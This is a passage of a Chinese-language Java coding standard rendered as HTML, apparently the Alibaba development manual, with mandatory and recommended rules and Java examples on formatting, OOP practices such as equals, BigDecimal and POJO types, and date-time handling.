        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 在右大括号后直接结束，则必须换行</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>注释的双斜线与注释内容之间有且仅有一个空格。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  这是示例注释，请注意在双斜线之后有一个空格 </span>
<span class="token class-name">String</span> commentString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在进行类型强制转换时，右括号与强制转换值之间不需要任何空格隔开。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> first <span class="token operator">=</span> <span class="token number">3.2d</span><span class="token punctuation">;</span> 
<span class="token keyword">int</span> second <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>first <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：</p>
<p>1）第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。</p>
<p>2）运算符与下文一起换行。</p>
<p>3）方法调用的点符号与下文一起换行。</p>
<p>4）方法调用中的多个参数需要换行时，在逗号后进行。</p>
<p>5）在括号前不要换行，见反例。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点号一起换行 </span>
sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"yang"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"hao"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chen"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chen"</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"chen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">//  超过 120 个字符的情况下，不要在括号前换行 </span>
sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"are"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>append 
    <span class="token punctuation">(</span><span class="token string">"lucky"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">//  参数很多的方法调用可能超过 120 个字符，逗号后才是换行处 </span>
<span class="token function">method</span><span class="token punctuation">(</span>args1<span class="token punctuation">,</span> args2<span class="token punctuation">,</span> args3<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
    <span class="token punctuation">,</span> argsX<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>方法参数在定义和传入时，多个参数逗号后面必须加空格。</p>
<p><font color="#019858">正例：</font>下例中实参的 args1，后边必须要有一个空格。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">method</span><span class="token punctuation">(</span>args1<span class="token punctuation">,</span> args2<span class="token punctuation">,</span> args3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>IDE的 text file encoding 设置为 UTF-8; IDE中文件的换行符使用 Unix 格式，不要 使用 Windows 格式。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>单个方法的总行数不超过 80 行。</p>
<p><font color=" #977C00">说明：</font>除注释之外的方法签名、左右大括号、方法内代码、空行、回车及任何不可见字符的总行数不超过 80 行。</p>
<p><font color="#019858">正例：</font>代码逻辑分清红花和绿叶，个性和共性，绿叶逻辑单独出来成为额外方法，使主干代码更加清晰；共性逻辑抽取成为共性方法，便于复用和维护。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>没有必要增加若干空格来使变量的赋值等号与上一行对应位置的等号对齐。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> 
<span class="token keyword">long</span> two <span class="token operator">=</span> <span class="token number">2L</span><span class="token punctuation">;</span> 
<span class="token keyword">float</span> three <span class="token operator">=</span> <span class="token number">3F</span><span class="token punctuation">;</span> 
<span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #977C00">说明：</font>增加 sb 这个变量，如果需要对齐，则给 one、two、three 都要增加几个空格，在变量比较多的情 况下，是非常累赘的事情。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性。</p>
<p><font color=" #977C00">说明：</font>任何情形，没有必要插入多个空行进行隔开。</p>
</li>
</ol>
<h2 id="四-OOP-规约">(四)  OOP 规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成 本，直接用类名来访问即可。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有的覆写方法，必须加@Override 注解。</p>
<p><font color=" #977C00">说明：</font>getObject()与 get0bject()的问题。一个是字母的 O，一个是数字的 0，加@Override 可以准确判 断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>相同参数类型，相同业务含义，才可以使用 Java 的可变参数，避免使用 Object。</p>
<p><font color=" #977C00">说明：</font>可变参数必须放置在参数列表的最后。（建议开发者尽量不用可变参数编程）</p>
<p><font color="#019858">正例：</font>public List<user> listUsers(String type, Long… ids) {…}</user></p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>外部正在调用或者二方库依赖的接口，不允许修改方法签名，避免对接口调用方产生 影响。接口过时必须加@Deprecated 注解，并清晰地说明采用的新接口或者新服务是什么。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不能使用过时的类或方法。</p>
<p><font color=" #977C00">说明：</font>java.net.URLDecoder  中的方法 decode(String encodeStr)  这个方法已经过时，应该使用双参数 decode(String source, String encode)。接口提供方既然明确是过时接口，那么有义务同时提供新的接口； 作为调用方来说，有义务去考证过时方法的新实现是什么。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>Object 的 equals 方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。</p>
<p><font color="#019858">正例：</font>“test”.equals(object);</p>
<p><font color=" #FF4500">反例：</font>object.equals(“test”);</p>
<p><font color=" #977C00">说明：</font>推荐使用 JDK7 引入的工具类 java.util.Objects#equals(Object a, Object b)</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有整型包装类对象之间<font color="#0000FF">值的比较</font>，全部使用 equals 方法比较。</p>
<p><font color=" #977C00">说明：</font>对于 Integer var = ?  在<font color="#0000FF">-128 至 127</font> 之间的赋值，Integer 对象是在  IntegerCache.cache 产生， 会复用已有对象，这个区间内的 Integer 值可以直接使用==进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这是一个大坑，推荐使用 equals 方法进行判断。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>任何货币金额，均以最小货币单位且整型类型来进行存储。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>浮点数之间的等值判断，基本数据类型不能用==来比较，包装数据类型不能用 equals 来判断。</p>
<p><font color=" #977C00">说明：</font>浮点数采用“<strong>尾数+阶码</strong>”的编码方式，类似于科学计数法的“有效数字+指数”的表示方式。二进制无法精确表示大部分的十进制小数，具体原理参考《码出高效》</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">float</span> a <span class="token operator">=</span> <span class="token number">1.0F</span> <span class="token operator">-</span> <span class="token number">0.9F</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">0.9F</span> <span class="token operator">-</span> <span class="token number">0.8F</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 预期进入此代码块，执行其它业务逻辑</span>
    <span class="token comment">// 但事实上a==b的结果为false</span>
<span class="token punctuation">}</span>
<span class="token class-name">Float</span> x <span class="token operator">=</span> <span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Float</span> y <span class="token operator">=</span> <span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 预期进入此代码块，执行其它业务逻辑</span>
    <span class="token comment">// 但事实上equals的结果为false</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color="#019858">正例：</font></p>
<ol>
<li>
<p>指定一个误差范围，两个浮点数的差值在此范围之内，则认为是相等的。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">float</span> a <span class="token operator">=</span> <span class="token number">1.0F</span> <span class="token operator">-</span> <span class="token number">0.9F</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">0.9F</span> <span class="token operator">-</span> <span class="token number">0.8F</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> diff <span class="token operator">=</span> <span class="token number">1e-6F</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;</span> diff<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>使用 BigDecimal 来定义值，再进行浮点数的运算操作。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BigDecimal</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"1.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigDecimal</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"0.9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigDecimal</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigDecimal</span> x <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigDecimal</span> y <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如上所示 BigDecimal 的等值比较应使用 <code>compareTo()</code>方法，而不是 equals()方法。</p>
<p><font color=" #977C00">说明：</font>equals()方法会比较值和精度（1.0 与 1.00 返回结果为 false），而 compareTo()则会忽略精度。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>定义数据对象 DO 类时，属性类型要与数据库字段类型相匹配。</p>
<p><font color="#019858">正例：</font>数据库字段的 bigint 必须与类属性的 Long 类型相对应。</p>
<p><font color=" #FF4500">反例：</font>某个案例的数据库表 id 字段定义类型 bigint unsigned，实际类对象属性为 Integer，随着 id 越来 越大，超过 Integer 的表示范围而溢出成为负数。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁止使用构造方法 BigDecimal(double)的方式把 double 值转化为 BigDecimal 对象。</p>
<p><font color=" #977C00">说明：</font>BigDecimal(double)存在精度损失风险，在精确计算或值比较的场景中可能会导致业务逻辑异常。</p>
<p>如：BigDecimal g = new BigDecimal(0.1F);  实际的存储值为：0.10000000149</p>
<p><font color="#019858">正例：</font>优先推荐入参为 String 的构造方法，或使用 BigDecimal 的 valueOf 方法，此方法内部其实执行了 Double 的 toString，而 Double 的 toString 按 double 的实际能表达的精度对尾数进行了截断。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BigDecimal</span> recommend1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigDecimal</span> recommend2 <span class="token operator">=</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>关于基本数据类型与包装数据类型的使用标准如下：</p>
<p>1）  <font color=" #C00000">【强制】</font>所有的 POJO 类属性必须使用包装数据类型。</p>
<p>2）  <font color=" #C00000">【强制】</font>RPC 方法的返回值和参数必须使用包装数据类型。</p>
<p>3）  <font color=" #FFC000">【推荐】</font>所有的局部变量使用基本数据类型。</p>
<p><font color=" #977C00">说明：</font>POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。</p>
<p><font color="#019858">正例：</font>数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。</p>
<p><font color=" #FF4500">反例：</font>某业务的交易报表上显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示为 0%，这是不合理的，应该显示成中划线-。==所以包装数据类型 的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。==</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>定义 DO/DTO/VO 等 POJO 类时，不要设定任何属性默认值。</p>
<p><font color=" #FF4500">反例：</font>POJO 类的 createTime 默认值为 new Date()，但是这个属性在数据提取时并没有置入具体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如果完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。</p>
<p><font color=" #977C00">说明：</font>注意 serialVersionUID 不一致会抛出序列化运行时异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>POJO 类必须写 toString 方法。使用 IDE 中的工具：source &gt; generate toString 时，如果继承了另一个 POJO 类，注意在前面加一下 super.toString。</p>
<p><font color=" #977C00">说明：</font>在方法执行抛出异常时，可以直接调用 POJO 的 toString()方法打印其属性值，便于排查问题。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁止在 POJO 类中，同时存在对应属性 xxx 的 isXxx()和 getXxx()方法。</p>
<p><font color=" #977C00">说明：</font>框架在调用属性 xxx 的提取方法时，并不能确定哪个方法一定是被优先调用到的。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>使用索引访问用 String 的 split 方法得到的数组时，需做最后一个分隔符后有无内容 的检查，否则会有抛 IndexOutOfBoundsException 的风险。</p>
<p><font color=" #977C00">说明：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"a,b,c,,"</span><span class="token punctuation">;</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ary <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  预期大于 3，结果是 3 </span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读，此条规则优先于下一条。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>  类内方法定义的顺序依次是：公有方法或保护方法  &gt;  私有方法  &gt; getter / setter 方法。</p>
<p><font color=" #977C00">说明：</font>公有方法是类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为承载的信息价值较低，所有 Service 和 DAO 的 getter/setter 方法放在类体最后。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>setter 方法中，参数名称与类成员变量名称一致，this.成员名  =  参数名。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Integer</span> getData <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。</p>
<p><font color=" #977C00">说明：</font>下例中，反编译出的字节码文件显示每次循环都会 new 出一个 StringBuilder 对象，然后进行 append 操作，最后通过 toString 方法返回 String 对象，造成内存资源浪费。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"start"</span><span class="token punctuation">;</span> 

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      
    str <span class="token operator">=</span> str <span class="token operator">+</span> <span class="token string">"hello"</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字：</p>
<p>1）  不允许被继承的类，如：String 类。</p>
<p>2）  不允许修改引用的域对象，如：POJO 类的域变量。</p>
<p>3）  不允许被覆写的方法，如：POJO 类的 setter 方法。</p>
<p>4）  不允许运行过程中重新赋值的局部变量。</p>
<p>5）  避免上下文重复使用一个变量，使用 final 关键字可以强制重新定义一个变量，方便更好地进行重构。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>慎用 Object 的 clone 方法来拷贝对象。</p>
<p><font color=" #977C00">说明：</font>对象 clone 方法默认是浅拷贝，若想实现深拷贝，需覆写 clone 方法实现域对象的深度遍历式拷贝。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>类成员与方法访问控制从严：</p>
<p>1）  如果不允许外部直接通过 new 来创建对象，那么构造方法必须是 private。</p>
<p>2）  工具类不允许有 public 或 default 构造方法。</p>
<p>3）  类非 static 成员变量并且与子类共享，必须是 protected。</p>
<p>4）  类非 static 成员变量并且仅在本类使用，必须是 private。</p>
<p>5）  类 static 成员变量如果仅在本类使用，必须是 private。</p>
<p>6）  若是 static 成员变量，考虑是否为 final。</p>
<p>7）  类成员方法只供类内部调用，必须是 private。</p>
<p>8）  类成员方法只对继承类公开，那么限制为 protected。</p>
<p>​    <font color=" #977C00">说明：</font>任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。思考：如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 成员方法或成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，无限制的到处跑，那么你会担心的。</p>
</li>
</ol>
<h2 id="五-日期时间">(五)  日期时间</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>日期格式化时，传入 pattern 中表示年份统一使用小写的 y。</p>
<p><font color=" #977C00">说明：</font>日期格式化时，yyyy 表示当天所在的年，而大写的 YYYY代表是 week in which year（JDK7 之后 引入的概念），意思是当天所在的周属于的年份，一周从周日开始，周六结束，只要本周跨年，返回的 YYYY 就是下一年。</p>
<p><font color="#019858">正例：</font>表示日期和时间的格式如下所示：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在日期格式中分清楚大写的 M 和小写的 m，大写的 H 和小写的 h 分别指代的意义。</p>
<p><font color=" #977C00">说明：</font>日期格式中的这两对字母表意如下：</p>
<p>1）  表示月份是大写的 M；</p>
<p>2）  表示分钟则是小写的 m；</p>
<p>3）  24 小时制的是大写的 H；</p>
<p>4）  12 小时制的则是小写的 h。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>获取当前毫秒数：System.currentTimeMillis();  而不是 new Date().getTime()。</p>
<p><font color=" #977C00">说明：</font>如果想获取更加精确的纳秒级时间值，使用 System.nanoTime 的方式。在 JDK8 中，针对统计时间 等场景，推荐使用 <code>Instant </code>类。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不允许在程序任何地方中使用：</p>
<p>1）java.sql.Date  ：不记录时间，getHours()抛出异常</p>
<p>2）java.sql.Time ：不记录日期，getYear()抛出异常</p>
<p>3）java.sql.Timestamp：构造方法 super((time/1000)*1000)，在 Timestamp 属性 fastTime 和 nanos 分别存储秒和纳秒信息</p>
<p><font color=" #FF4500">反例：</font>  java.util.Date.after(Date)进行时间比较时，当入参是 java.sql.Timestamp时，会触发 JDK BUG(JDK9 已修复)，可能导致比较时的意外结果。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不要在程序中写死一年为 365 天，避免在公历闰年时出现日期转换错误或程序逻辑 错误。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  获取今年的天数 </span>
<span class="token keyword">int</span> daysOfThisYear <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lengthOfYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  获取指定某年的天数 </span>
<span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2011</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lengthOfYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  第一种情况：在闰年 366 天时，出现数组越界异常 </span>
<span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dayArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">365</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

<span class="token comment">//  第二种情况：一年有效期的会员制，今年 1 月 26 日注册，硬编码 365 返回的却是 1 月 25 日 </span>
<span class="token class-name">Calendar</span> calendar <span class="token operator">=</span> <span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
calendar<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2020</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
calendar<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Calendar</span><span class="token punctuation">.</span><span class="token constant">DATE</span><span class="token punctuation">,</span> <span class="token number">365</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>避免公历闰年 2 月问题。闰年的 2 月份有 29 天，一年后的那一天不可能是 2 月 29 日。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>使用枚举值来指代月份。如果使用数字，注意 Date，Calendar 等日期相关类的月份 month 取值在 0-11 之间。</p>
<p><font color=" #977C00">说明：</font>参考 JDK 原生注释，Month value is 0-based. e.g., 0 for January.</p>
<p><font color="#019858">正例：</font> Calendar.JANUARY，Calendar.FEBRUARY，Calendar.MARCH 等来指代相应月份来进行传参或比较。</p>
</li>
</ol>
<h2 id="六-集合处理">(六)  集合处理</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>关于 hashCode 和 equals 的处理，遵循如下规则：</p>
<ul>
<li>只要覆写 equals，就必须覆写 hashCode。</li>
<li>因为 Set 存储的是不重复的对象，依据 hashCode 和 equals 进行判断，所以 Set 存储的对象必须覆写这两种方法。</li>
